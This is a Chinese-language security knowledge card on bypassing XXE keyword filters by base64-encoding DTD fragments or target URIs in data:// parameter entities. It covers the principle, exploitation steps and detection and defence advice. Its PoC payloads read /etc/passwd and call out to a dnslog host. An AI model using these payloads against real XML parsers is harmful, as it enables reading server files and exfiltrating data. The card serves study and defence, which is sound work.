---
id: web-generic-xxe-data-uri-base64-hide-system-uri
title: XXE 关键字绕过：把 SYSTEM 的 file:// / http:// 目标塞进 data:// base64 外部参数实体
type: scenario
domain: web
path: web/generic/xxe
technique: xxe-data-uri-base64-hide-system-identifier
aliases:
- data:// base64 绕过 XXE 过滤
- 参数实体隐藏 SYSTEM 关键字
- XXE WAF 关键字绕过
- data:text/plain;base64 外部实体
tags:
- xxe
- bypass
- waf
- data-uri
- base64
- parameter-entity
- xml
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:59:39+08:00'
  notes: 已对照原文核对；data:// base64 隐藏 SYSTEM URI 两条 payload 与原文逐字一致（解码 file:///etc/passwd 与 http://dnslog.cn 已本地校验），并注明原文那种只编码 URI 的写法仅证明隐藏有效；未访问文中地址
---

## 一句话结论

当过滤只拦 XML 里可见的关键字（`file://`、`http://`、`SYSTEM`、外带域名）时，可以把"要加载的 DTD 片段/目标 URI"先 Base64 编码，再用 `<!ENTITY % init SYSTEM "data://text/plain;base64,<b64>"> %init;` 这种 data: 伪协议外部参数实体引入；解析器解码后按 DTD 解析，源码里既没有明文路径也没有外带域名，静态关键字过滤因此失效。

## 原理

- **DTD 允许外部参数实体**：`<!ENTITY % name SYSTEM "<uri>">` 会去加载该 URI 并把内容当作 DTD 片段展开，`%name;` 触发加载。因此"加载什么"完全写在一个 URI 字符串里。
- **`data:` 是自带内容的 URI**：`data:text/plain;base64,<b64>` 把内容内联在 URI 中，解析器（libxml2 等）读到的是 Base64 解码后的字节。把 DTD 片段放在这里，等于"用一段无关键字的字符串替代一段有关键字的 DTD"。
- **两段式隐藏**：常见结构是先引入 `%init;`（内容为"再定义一个读文件的实体"或"定义外带实体"），再在主文档里引用。原文示例把 `file:///etc/passwd` 直接 Base64 成 `ZmlsZTovLy9ldGMvcGFzc3dk` 放进 `%init;`——这一步只演示了"URI 被 base64 藏起来"，解码出来是纯 URI 文本而不是合法 DTD，直接展开会报错；要真正利用，编码进去的应是完整 DTD 片段（例如 `<!ENTITY % f SYSTEM "file:///etc/passwd">` 或拼 URL 的参数实体定义）。
- **为什么能过 WAF**：请求体/文件内容里看不到 `file`、`http`、`/etc/passwd`、`dnslog` 等 token；Base64 字符集也不会触发路径/协议类正则。这是"输入侧关键字"与"解析侧真实语义"之间的差异，和 UTF-16 编码绕过、实体拼接属于同一族。
- **无回显同样适用**：外带域名也可以 Base64 化，`%init;` 展开后定义的实体再拼出 HTTP 请求，DNS/HTTP 侧只能看到最终请求（此时域名是解码后的明文，但过滤阶段已过）。

## 触发条件

- 目标 XML 解析器允许外部实体/外部 DTD（未设 `LIBXML_NONET`、未 `setExpandEntityReferences(false)`、`libxml_disable_entity_loader` 为 false 等）；
- 解析器支持 `data:` 伪协议读取（libxml2 默认支持 PHP stream/CDATA 类 URI；纯 Java 解析器通常不支持，需要目标基于 libxml2/PHP 等）；
- 过滤位于"内容关键字"层（WAF、正则、字符串黑名单），而非 AST/白名单；
- 有可回显位置或可用 OOB 通道。

## 利用步骤

1. 先确认解析器是否解析外部参数实体：提交一个最小的 `<!ENTITY % e SYSTEM "http://<dnslog>"> %e;`，看是否产生出站请求。
2. 若被过滤：把要加载的 DTD 片段 Base64 化，例如 `file:///etc/passwd` → `ZmlsZTovLy9ldGMvcGFzc3dk`。
3. 用 data: 参数实体引入：`<!DOCTYPE t [ <!ENTITY % init SYSTEM "data://text/plain;base64,<b64>"> %init; ]><t/>`。
4. 若第 3 步用于读文件，把 Base64 内容换成完整 DTD（定义 `%file` 或普通实体后引用），再在主文档里回显或外带。
5. 外带场景把目标域名同样 Base64 化，减少请求体中的可疑 token。

## PoC

原文示例（演示隐藏 URI，解码后为 `file:///etc/passwd`）：

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

可用的读文件形态（把完整 DTD 片段 Base64 进去，再引用实体）：

```xml
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "data://text/plain;base64,<base64 of: <!ENTITY % f SYSTEM "file:///etc/passwd">>">
  %dtd;
]>
<root>&f;</root>
```

无回显外带示例（隐藏 DNS/HTTP 目标）：

```xml
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "data://text/plain;base64,aHR0cDovL2Ruc2xvZy5jbg=="> %ext; ]>
<r></r>
```

（`aHR0cDovL2Ruc2xvZy5jbg==` 解码为 `http://dnslog.cn`。）

## 变体与关联

- 变体：Base64 之外还可用 `data:text/plain,` 的百分号编码、实体拼接（`&lt;`）、UTF-16BE 重编码来隐藏关键字。
- 变体：把 DTD 片段放进另一个伪协议（`php://filter/convert.base64-decode/resource=data://...`）做二次编码。
- 关联：[[web-generic-xxe-utf16be-encoding-filter-bypass]]（同为编码层绕过，但那条是利用整篇 XML 的字符编码，本卡只针对 URI 字符串）。
- 关联：[[binary-pwn-sandbox-escape-python-generator-frame-builtins-recovery]]（无关但同属"解析侧语义与过滤侧字符串不一致"的思路，可作类比）。
- 边界：Java 侧解析器一般不实现 `data:` URI 解析，本手法更适用于 PHP/libxml2 与部分 Python 解析器；`data:` 内容必须是合法 DTD 片段才能被展开，原文那种"只编码 URI"的写法仅能证明隐藏有效。

## 检测与防御

- 检测：请求/文件内容中出现 `data:` + 长 Base64 片段，尤其与 `DOCTYPE`/`ENTITY` 同现；解码后出现 `file://`、`http://`、`php://` 等协议；解析器日志中出现 data URI 加载。
- 防御：彻底禁用外部实体与外部 DTD（`LIBXML_NONET`、`libxml_disable_entity_loader(true)`、`setExpandEntityReferences(false)`、`XMLConstants.FEATURE_SECURE_PROCESSING`）；解析前做协议白名单，不信任内容层关键字过滤。
